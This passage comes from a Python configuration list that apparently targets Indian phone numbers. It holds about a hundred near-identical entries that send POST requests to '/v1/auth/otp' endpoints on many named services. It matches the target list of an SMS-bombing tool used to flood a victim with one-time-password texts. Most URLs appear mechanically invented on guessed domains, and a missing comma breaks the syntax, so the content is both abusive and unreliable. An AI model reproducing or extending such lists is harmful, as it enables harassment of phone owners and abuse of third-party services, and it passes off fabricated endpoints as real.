    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sketch.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 117
{
    'name': 'InVision_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.invisionapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 118
{
    'name': 'Marvel_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.marvelapp.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 119
{
    'name': 'Proto.io_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.proto.io/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 120
{
    'name': 'UXPin_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.uxpin.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 121
{
    'name': 'Balsamiq_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.balsamiq.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 122
{
    'name': 'Axure_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.axure.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 123
{
    'name': 'MockFlow_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mockflow.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 124
{
    'name': 'Wireframe_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wireframe.cc/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 125
{
    'name': 'Mockplus_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mockplus.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 126
{
    'name': 'JustInMind_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.justinmind.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 127
{
    'name': 'Pidoco_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pidoco.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 128
{
    'name': 'HotGloo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hotgloo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 129
{
    'name': 'FluidUI_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.fluidui.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 130
{
    'name': 'Framer_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.framer.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 131
{
    'name': 'Origami_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.origami.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Principle_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.principle.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 133
{
    'name': 'Keynote_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.keynote.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 134
{
    'name': 'PowerPoint_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.powerpoint.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 135
{
    'name': 'Google_Slides_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.slides.google.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 136
{
    'name': 'Prezi_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.prezi.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 137
{
    'name': 'SlideShare_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.slideshare.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 138
{
    'name': 'HaikuDeck_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.haikudeck.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 139
{
    'name': 'Emaze_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.emaze.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 140
{
    'name': 'Sway_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.sway.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 141
{
    'name': 'Visme_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.visme.co/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 142
{
    'name': 'Beautiful.ai_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.beautiful.ai/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 143
{
    'name': 'Gamma_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gamma.app/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 144
{
    'name': 'Tome_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tome.app/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 145
{
    'name': 'Pitch_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pitch.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 146
{
    'name': 'Zight_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.zight.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 147
{
    'name': 'Loom_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.loom.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 148
{
    'name': 'ScreenRec_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.screenrec.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 149
{
    'name': 'OBS_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.obsproject.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 150
{
    'name': 'Streamlabs_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.streamlabs.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
}
# 151
{
    'name': 'Twitch_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.twitch.tv/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 152
{
    'name': 'YouTube_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://www.youtube.com/api/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Reddit_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.reddit.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 154
{
    'name': 'TikTok_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tiktok.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 155
{
    'name': 'Snapchat_Login_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://accounts.snapchat.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 156
{
    'name': 'Pinterest_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pinterest.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 157
{
    'name': 'Tumblr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tumblr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 158
{
    'name': 'Flickr_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.flickr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 159
{
    'name': 'Vimeo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.vimeo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 160
{
    'name': 'Dailymotion_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dailymotion.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 161
{
    'name': 'SoundCloud_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.soundcloud.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 162
{
    'name': 'Spotify_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spotify.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 163
{
    'name': 'Apple_Music_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.applemusic.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 164
{
    'name': 'Amazon_Music_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.amazonmusic.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 165
{
    'name': 'Gaana_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.gaana.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 166
{
    'name': 'JioSaavn_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.jiosaavn.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 167
{
    'name': 'Wynk_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wynk.in/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 168
{
    'name': 'Hungama_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hungama.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 169
{
    'name': 'YouTube_Music_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.youtube.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Tidal_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tidal.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 171
{
    'name': 'Deezer_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.deezer.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 172
{
    'name': 'Pandora_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pandora.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 173
{
    'name': 'iHeartRadio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.iheartradio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 174
{
    'name': 'SiriusXM_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.siriusxm.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 175
{
    'name': 'TuneIn_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tunein.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 176
{
    'name': 'Radioplayer_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.radioplayer.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 177
{
    'name': 'Audible_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.audible.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 178
{
    'name': 'Storytel_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.storytel.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 179
{
    'name': 'Kobo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.kobo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Scribd_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.scribd.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 181
{
    'name': 'Medium_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.medium.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 182
{
    'name': 'Substack_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.substack.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 183
{
    'name': 'Ghost_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.ghost.org/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 184
{
    'name': 'WordPress_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.wordpress.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 185
{
    'name': 'Blogger_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.blogger.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 186
{
    'name': 'Tumblr_Login_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.tumblr.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 187
{
    'name': 'LiveJournal_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.livejournal.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 188
{
    'name': 'Xing_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.xing.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 189
{
    'name': 'Viadeo_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.viadeo.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 190
{
    'name': 'About.me_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.about.me/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 191
{
    'name': 'AngelList_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.angellist.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 192
{
    'name': 'ProductHunt_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.producthunt.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'IndieHackers_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.indiehackers.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 194
{
    'name': 'Dev.to_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.dev.to/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 195
{
    'name': 'Hashnode_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hashnode.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 196
{
    'name': 'Devfolio_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.devfolio.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 197
{
    'name': 'Hackathon_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hackathon.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 198
{
    'name': 'MLH_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.mlh.io/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 199
{
    'name': 'HackerRank_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hackerrank.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 200
{
    'name': 'LeetCode_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.leetcode.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 201
{
    'name': 'CodeChef_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codechef.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 202
{
    'name': 'Codeforces_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codeforces.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 203
{
    'name': 'AtCoder_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.atcoder.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 204
{
    'name': 'TopCoder_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.topcoder.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 205
{
    'name': 'SPOJ_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.spoj.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 206
{
    'name': 'HackerEarth_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.hackerearth.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
{
    'name': 'Codewars_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codewars.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 208
{
    'name': 'Codingame_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.codingame.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 209
{
    'name': 'Pluralsight_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.pluralsight.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 210
{
    'name': 'Coursera_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.coursera.com/v1/auth/otp',
    'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
    'data': lambda phone: f'{{"phone":"{phone}","countryCode":"91"}}'
},
# 211
{
    'name': 'edX_SMS',
    'type': 'sms',
    'country': 'in',
    'method': 'POST',
    'url': 'https://api.edx.com/v1/auth/otp',
